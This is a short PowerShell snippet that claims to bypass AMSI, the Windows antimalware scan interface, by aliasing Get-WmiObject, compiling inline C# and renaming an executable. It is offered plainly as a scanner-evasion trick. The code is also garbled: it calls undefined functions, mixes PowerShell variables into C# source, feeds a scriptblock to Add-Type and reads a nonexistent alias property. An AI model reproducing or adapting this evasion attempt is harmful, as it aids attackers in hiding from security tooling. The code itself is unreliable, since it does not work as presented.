#Reconfigure Get-WmiObject to dodge AMSI:

Function Hide-WmiEvent
{
    Set-Alias Wmi Get-WmiObject
    $hide = {
        $WmiExeActionName = $MyInvocation.InvocationName
        add-type @"
        using System;
        using System.Diagnostics;
        using System.Text;
        namespace HT {
            public class WmiClass {
                            public static void WmiNew(string BlockActionConsole)
                            {
                                        $BlockActionConsole
                                        ReportEvent(HexEncode ("ByPass"+" "+"Operation throwing exception"));
                            }
            }
        }
        "@
        Add-Type -TypeDefinition $hide -PassThru
        [HT.WmiClass]::WmiNew()
    }
    Invoke-Command -Scriptblock $hide
    Rename-Item -Force -LiteralPath (Get-Alias Wmi).ExeName -NewName 'Get-EventToTable.exe'
}

#call the function
